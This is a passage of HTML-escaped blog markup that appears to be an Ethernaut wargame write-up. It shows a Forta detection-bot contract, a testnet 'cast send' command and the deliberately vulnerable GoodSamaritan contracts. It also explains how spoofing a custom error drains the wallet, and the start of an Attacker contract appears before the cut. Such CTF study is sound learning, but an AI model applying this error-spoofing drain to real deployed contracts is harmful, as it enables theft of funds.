&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;DetectionBot &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IDetectionBot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; cryptoVault;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_cryptoVault) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        cryptoVault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _cryptoVault;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; origSender;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; select `origSender` from calldata. 
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;v0.8.15&#x2F;abi-spec.html#abi.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; could see others writeup for details :D
&lt;&#x2F;span&gt;&lt;span&gt;            origSender := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;calldataload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xa8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(origSender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; cryptoVault) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IForta&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(user);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;forta&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x902389eFE38022B065DFBFB4D9F9F065aC1d7004&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cryptoVault&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0xd402609c99EC210563e32b24934b7FF98dF3f4c0&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0x902389eFE38022B065DFBFB4D9F9F065aC1d7004 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;setDetectionBot(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --rpc-url https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PRVT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt; --&lt;&#x2F;span&gt;&lt;span&gt; 0xCf5D488ff4Ec2Ce88dE6a823bFE6C080BB35523C
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;good-samaritan&quot;&gt;Good Samaritan&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &amp;gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0 &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.9.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;utils&#x2F;Address.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GoodSamaritan &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;wallet;
&lt;&#x2F;span&gt;&lt;span&gt;    Coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;coin;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Wallet&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Coin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(wallet));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        wallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setCoin&lt;&#x2F;span&gt;&lt;span&gt;(coin);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;requestDonation&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; enoughBalance){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; donate 10 coins to requester
&lt;&#x2F;span&gt;&lt;span&gt;        try wallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;donate10&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } catch (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;err) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;NotEnoughBalance()&amp;quot;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== keccak256&lt;&#x2F;span&gt;&lt;span&gt;(err)) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; send the coins left
&lt;&#x2F;span&gt;&lt;span&gt;                wallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferRemainder&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;                return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Coin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    using Address for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; balances;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;InsufficientBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;current, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;required);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;wallet_) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; one million coins for Good Samaritan initially
&lt;&#x2F;span&gt;&lt;span&gt;        balances[wallet_] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;dest_, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount_) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; currentBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; transfer only occurs if balance is enough
&lt;&#x2F;span&gt;&lt;span&gt;        if(amount_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span&gt; currentBalance) {
&lt;&#x2F;span&gt;&lt;span&gt;            balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-=&lt;&#x2F;span&gt;&lt;span&gt; amount_;
&lt;&#x2F;span&gt;&lt;span&gt;            balances[dest_] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt; amount_;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if(dest_.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isContract&lt;&#x2F;span&gt;&lt;span&gt;()) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; notify contract 
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;INotifyable&lt;&#x2F;span&gt;&lt;span&gt;(dest_).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(amount_);
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;InsufficientBalance&lt;&#x2F;span&gt;&lt;span&gt;(currentBalance, amount_);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Wallet &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; The owner of the wallet instance
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;coin;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;OnlyOwner&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyOwner&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender !=&lt;&#x2F;span&gt;&lt;span&gt; owner) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;OnlyOwner&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;donate10&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;dest_) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; check balance left
&lt;&#x2F;span&gt;&lt;span&gt;        if (coin.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; donate 10 coins
&lt;&#x2F;span&gt;&lt;span&gt;            coin.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(dest_, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferRemainder&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;dest_) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; transfer balance left
&lt;&#x2F;span&gt;&lt;span&gt;        coin.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(dest_, coin.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setCoin&lt;&#x2F;span&gt;&lt;span&gt;(Coin coin_) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; coin_;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;INotifyable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;uh… just throw a same custom error in &lt;code&gt;Notifyable&lt;&#x2F;code&gt; contract. Kinda easy(?&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &amp;gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0 &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.9.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IGoodSamaritan &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;requestDonation&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; enoughBalance);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Attacker &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    IGoodSamaritan _GoodSamaritan;
